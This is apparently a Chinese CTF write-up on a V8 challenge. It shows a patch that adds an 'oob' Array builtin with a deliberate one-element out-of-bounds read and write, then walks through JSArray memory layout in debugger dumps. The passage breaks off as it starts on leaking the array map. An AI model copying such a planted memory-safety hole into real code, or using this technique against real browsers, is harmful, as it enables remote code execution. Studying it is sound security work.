<p>V8 常用调试命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set args --allow-natives-syntax --shell ./exp.js </span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<ul>
<li>为 JSArray 对象新增了一个 ArrayOob 方法：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(ArrayOob)&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements()); <span class="comment">/* 获取Array对象的elements */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number()); <span class="comment">/* 获取Array长度 */</span></span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;</span><br><span class="line">        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;Number());</span><br><span class="line">        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果输入参数个数为“1”：把下标为 <code>length</code> 的元素读取出来（越界读1字）</li>
<li>如果输入参数个数为“2”：在下标为 <code>length</code> 的元素处写入 <code>value</code>（越界写1字）</li>
<li>否则返回 <code>undefined_value</code> </li>
<li>PS：<code>this</code> 也算一个参数</li>
</ul>
<p><strong>JS 对象内存信息布局</strong></p>
<p>现在有 “越界读1字节/越界写1字节”，要想成功利用则需要先掌握 JSArray 对象的内存布局</p>
<ul>
<li>测试用 JavaScript 代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key in foo) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(`key:$&#123;key&#125;, value:$&#123;foo[key]&#125;`)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 GDB 进行打印：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(foo)</span><br><span class="line">DebugPrint: <span class="number">0xebe3f60df81</span>: [JS_OBJECT_TYPE]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x33a9ca10afe9</span> &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0ebe3f60de81</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x33a9ca10ac29</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x0ebe3f60e019</span> &lt;FixedArray[<span class="number">17</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: <span class="number">0x0ebe3f60eb41</span> &lt;PropertyArray[<span class="number">3</span>]&gt; &#123;</span><br><span class="line">    #property0: <span class="number">0x0ebe3f60e221</span> &lt;String[<span class="number">9</span>]: property0&gt; (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #property1: <span class="number">0x0ebe3f60e291</span> &lt;String[<span class="number">9</span>]: property1&gt; (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #property2: <span class="number">0x0ebe3f60e339</span> &lt;String[<span class="number">9</span>]: property2&gt; (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #property3: <span class="number">0x0ebe3f60e3d9</span> &lt;String[<span class="number">9</span>]: property3&gt; (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line">    #property4: <span class="number">0x0ebe3f60e491</span> &lt;String[<span class="number">9</span>]: property4&gt; (<span class="keyword">const</span> data field <span class="number">4</span>)</span><br><span class="line">    #property5: <span class="number">0x0ebe3f60e561</span> &lt;String[<span class="number">9</span>]: property5&gt; (<span class="keyword">const</span> data field <span class="number">5</span>)</span><br><span class="line">    #property6: <span class="number">0x0ebe3f60e649</span> &lt;String[<span class="number">9</span>]: property6&gt; (<span class="keyword">const</span> data field <span class="number">6</span>)</span><br><span class="line">    #property7: <span class="number">0x0ebe3f60e749</span> &lt;String[<span class="number">9</span>]: property7&gt; (<span class="keyword">const</span> data field <span class="number">7</span>)</span><br><span class="line">    #property8: <span class="number">0x0ebe3f60e861</span> &lt;String[<span class="number">9</span>]: property8&gt; (<span class="keyword">const</span> data field <span class="number">8</span>)</span><br><span class="line">    #property9: <span class="number">0x0ebe3f60e9a9</span> &lt;String[<span class="number">9</span>]: property9&gt; (<span class="keyword">const</span> data field <span class="number">9</span>)</span><br><span class="line">    #property10: <span class="number">0x0ebe3f60e9e9</span> &lt;String[<span class="number">10</span>]: property10&gt; (<span class="keyword">const</span> data field <span class="number">10</span>) properties[<span class="number">0</span>]</span><br><span class="line">    #property11: <span class="number">0x0ebe3f60eb89</span> &lt;String[<span class="number">10</span>]: property11&gt; (<span class="keyword">const</span> data field <span class="number">11</span>) properties[<span class="number">1</span>]</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0ebe3f60e019</span> &lt;FixedArray[<span class="number">17</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">0x0ebe3f60dfe9</span> &lt;String[<span class="number">8</span>]: element0&gt;</span><br><span class="line">           <span class="number">1</span>: <span class="number">0x0ebe3f60e0e9</span> &lt;String[<span class="number">8</span>]: element1&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x0ebe3f60e101</span> &lt;String[<span class="number">8</span>]: element2&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x0ebe3f60e119</span> &lt;String[<span class="number">8</span>]: element3&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x0ebe3f60e131</span> &lt;String[<span class="number">8</span>]: element4&gt;</span><br><span class="line">           <span class="number">5</span>: <span class="number">0x0ebe3f60e149</span> &lt;String[<span class="number">8</span>]: element5&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">0x0ebe3f60e161</span> &lt;String[<span class="number">8</span>]: element6&gt;</span><br><span class="line">           <span class="number">7</span>: <span class="number">0x0ebe3f60e179</span> &lt;String[<span class="number">8</span>]: element7&gt;</span><br><span class="line">           <span class="number">8</span>: <span class="number">0x0ebe3f60e191</span> &lt;String[<span class="number">8</span>]: element8&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x0ebe3f60e1a9</span> &lt;String[<span class="number">8</span>]: element9&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x0ebe3f60e1c1</span> &lt;String[<span class="number">9</span>]: element10&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x0ebe3f60e1e1</span> &lt;String[<span class="number">9</span>]: element11&gt;</span><br><span class="line">       <span class="number">12</span><span class="number">-16</span>: <span class="number">0x0bb7280405b1</span> &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="number">0x33a9ca10afe9</span>: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">104</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="keyword">enum</span> length: <span class="number">12</span></span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x33a9ca10af99</span> &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x0988cf39f971</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x0ebe3f60ea09</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - prototype: <span class="number">0x0ebe3f60de81</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x33a9ca10ac29</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x0988cf39f689</span> &lt;JSFunction Foo (sfi = <span class="number">0x988cf39f381</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0bb7280402c1</span> &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0</span>: <span class="string">&quot;element0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;element1&quot;</span>, <span class="number">2</span>: <span class="string">&quot;element2&quot;</span>, <span class="number">3</span>: <span class="string">&quot;element3&quot;</span>, <span class="number">4</span>: <span class="string">&quot;element4&quot;</span>, <span class="number">5</span>: <span class="string">&quot;element5&quot;</span>, <span class="number">6</span>: <span class="string">&quot;element6&quot;</span>, <span class="number">7</span>: <span class="string">&quot;element7&quot;</span>, <span class="number">8</span>: <span class="string">&quot;element8&quot;</span>, <span class="number">9</span>: <span class="string">&quot;element9&quot;</span>, <span class="number">10</span>: <span class="string">&quot;element10&quot;</span>, <span class="number">11</span>: <span class="string">&quot;element11&quot;</span>, property0: <span class="string">&quot;property0&quot;</span>, property1: <span class="string">&quot;property1&quot;</span>, property2: <span class="string">&quot;property2&quot;</span>, property3: <span class="string">&quot;property3&quot;</span>, property4: <span class="string">&quot;property4&quot;</span>, property5: <span class="string">&quot;property5&quot;</span>, property6: <span class="string">&quot;property6&quot;</span>, property7: <span class="string">&quot;property7&quot;</span>, property8: <span class="string">&quot;property8&quot;</span>, property9: <span class="string">&quot;property9&quot;</span>, property10: <span class="string">&quot;property10&quot;</span>, property11: <span class="string">&quot;property11&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>打印 JS_OBJECT_TYPE：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xebe3f60df81</span><span class="number">-1</span> <span class="comment">/* JS_OBJECT_TYPE */</span></span><br><span class="line"><span class="number">0xebe3f60df80</span>:	<span class="number">0x000033a9ca10afe9</span>	<span class="number">0x00000ebe3f60eb41</span></span><br><span class="line"><span class="number">0xebe3f60df90</span>:	<span class="number">0x00000ebe3f60e019</span>	<span class="number">0x00000ebe3f60e221</span></span><br><span class="line"><span class="number">0xebe3f60dfa0</span>:	<span class="number">0x00000ebe3f60e291</span>	<span class="number">0x00000ebe3f60e339</span></span><br><span class="line"><span class="number">0xebe3f60dfb0</span>:	<span class="number">0x00000ebe3f60e3d9</span>	<span class="number">0x00000ebe3f60e491</span></span><br><span class="line"><span class="number">0xebe3f60dfc0</span>:	<span class="number">0x00000ebe3f60e561</span>	<span class="number">0x00000ebe3f60e649</span></span><br><span class="line"><span class="number">0xebe3f60dfd0</span>:	<span class="number">0x00000ebe3f60e749</span>	<span class="number">0x00000ebe3f60e861</span></span><br><span class="line"><span class="number">0xebe3f60dfe0</span>:	<span class="number">0x00000ebe3f60e9a9</span>	<span class="number">0x00000bb728040941</span></span><br><span class="line"><span class="number">0xebe3f60dff0</span>:	<span class="number">0x0000000800000003</span>	<span class="number">0x30746e656d656c65</span></span><br><span class="line"><span class="number">0xebe3f60e000</span>:	<span class="number">0x00000bb728040801</span>	<span class="number">0x0000000100000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前3个数据分别为 <code>map properties elements</code> 的地址</li>
<li>接下来的10个一字空间分别用于存储 [<code>property0</code>：<code>property9</code>]</li>
<li>PS：没有使用指针压缩技术（直接把8字节的指针存入内存）</li>
</ul>
<p>V8 拥有两种类似的属性：</p>
<ul>
<li>索引属性（Array-indexed Properties） </li>
<li>命名属性（Named Properties） </li>
</ul>
<p>V8 遍历时一般会先遍历前者，前后两者在底层存储在两个单独的数据结构中，分别用 <code>elements</code> 和 <code>properties</code> 两个指针指向它们</p>
<ul>
<li>如果命名属性少于等于10个时，命名属性会直接存储到对象本身，而无需先通过 properties 指针查询（直接存储到对象本身的属性被称为对象内属性 In-object Properties）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x00000ebe3f60eb41</span><span class="number">-1</span> <span class="comment">/* properties */</span></span><br><span class="line"><span class="number">0xebe3f60eb40</span>:	<span class="number">0x00000bb728041909</span>	<span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0xebe3f60eb50</span>:	<span class="number">0x00000ebe3f60e9e9</span>	<span class="number">0x00000ebe3f60eb89</span></span><br><span class="line"><span class="number">0xebe3f60eb60</span>:	<span class="number">0x00000bb7280404d1</span>	<span class="number">0x00000bb728041f49</span></span><br></pre></td></tr></table></figure>
<ul>
<li>从第3个指针开始，就是：[<code>property10</code>：<code>property11</code>]（前10个存储在对象内部）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x00000ebe3f60e019</span><span class="number">-1</span> <span class="comment">/* elements */</span></span><br><span class="line"><span class="number">0xebe3f60e018</span>:	<span class="number">0x00000bb728040801</span>	<span class="number">0x0000001100000000</span></span><br><span class="line"><span class="number">0xebe3f60e028</span>:	<span class="number">0x00000ebe3f60dfe9</span>	<span class="number">0x00000ebe3f60e0e9</span></span><br><span class="line"><span class="number">0xebe3f60e038</span>:	<span class="number">0x00000ebe3f60e101</span>	<span class="number">0x00000ebe3f60e119</span></span><br></pre></td></tr></table></figure>
<ul>
<li>从第3个指针开始，就是：[<code>element0</code>：<code>element11</code>]</li>
</ul>
<p>对于本题目来说，更重要的特性是：</p>
<ul>
<li>JSArray 对象的 <code>elements</code> 就分配在 JSArray 的相邻上方</li>
</ul>
<p>测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(floatArray)</span><br><span class="line"><span class="number">0x116973d4e061</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>JSArray 所在地址为 <code>0x116973d4e061-1</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x116973d4e061</span> <span class="comment">/* JSArray */</span></span><br><span class="line"><span class="number">0x116973d4e061</span>: [JSArray]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0177b6302ed9</span> &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x3b1820a11111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x116973d4e039</span> &lt;FixedDoubleArray[<span class="number">3</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">3</span></span><br><span class="line"> - properties: <span class="number">0x2ad6f06c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x3c17ff4801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x116973d4e039</span> &lt;FixedDoubleArray[<span class="number">3</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.11</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.22</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3.33</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x116973d4e039</span> <span class="comment">/* JSArray-&gt;elements */</span></span><br><span class="line"><span class="number">0x116973d4e039</span>: [FixedDoubleArray]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x2ad6f06c14f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">3</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1.11</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.22</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3.33</span></span><br></pre></td></tr></table></figure>
<ul>
<li>JSArray-&gt;elements 所在地址为 <code>0x116973d4e039-1</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &#123;<span class="keyword">double</span>&#125;(<span class="number">0x116973d4e048</span>)</span><br><span class="line">$<span class="number">1</span> = <span class="number">1.1100000000000001</span></span><br><span class="line">pwndbg&gt; p &#123;<span class="keyword">double</span>&#125;(<span class="number">0x116973d4e050</span>)</span><br><span class="line">$<span class="number">2</span> = <span class="number">2.2200000000000002</span></span><br><span class="line">pwndbg&gt; p &#123;<span class="keyword">double</span>&#125;(<span class="number">0x116973d4e058</span>)</span><br><span class="line">$<span class="number">3</span> = <span class="number">3.3300000000000001</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现：JSArray-&gt;elements 和 JSArray 是相邻的</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>我们拥有一字的越界写和一字的越界写</p>
<p>这一字的越界读刚好可以泄露出 JSArray-&gt;map：</p>
